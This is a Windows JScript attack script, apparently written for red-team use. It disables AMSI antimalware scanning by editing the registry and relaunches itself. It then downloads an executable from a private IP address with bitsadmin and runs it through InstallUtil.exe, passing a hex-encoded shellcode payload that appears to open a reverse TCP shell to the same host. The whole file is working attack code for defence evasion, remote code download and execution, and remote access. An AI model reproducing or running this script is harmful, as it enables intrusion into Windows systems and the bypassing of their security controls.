// 4MS7_BYP455
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
    var AmsiEnable = sh.RegRead(key);
    if(AmsiEnable!=0){
    throw new Error(1, '');
    }
}catch(e){
    sh.RegWrite(key, 0, "REG_DWORD");
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
    sh.RegWrite(key, 1, "REG_DWORD");
    WScript.Quit(1);
}

var cmd = "bitsadmin /transfer myjob /download /priority high http://192.168.45.182/windows/bin/redteam-yadokari.exe C:\\Windows\\Temp\\redteam-yadokari.exe";
var cmd2 = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Installutil.exe /logfile= /LogToConsole=false /payload=fc4883e4f0e8cc0000004151415052514831d25665488b5260488b5218488b5220488b72504d31c9480fb74a4a4831c0ac3c617c022c2041c1c90d4101c1e2ed52488b52208b423c41514801d0668178180b020f85720000008b80880000004885c074674801d08b481850448b40204901d0e35648ffc94d31c9418b34884801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b0488415841584801d05e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc020001bbc0a82db641544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a0059bbe01d2a0a4189daffd5 /U C:\\Windows\\Temp\\redteam-yadokari.exe"
var deploy = sh.Run(cmd);
deploy = sh.Run(cmd2);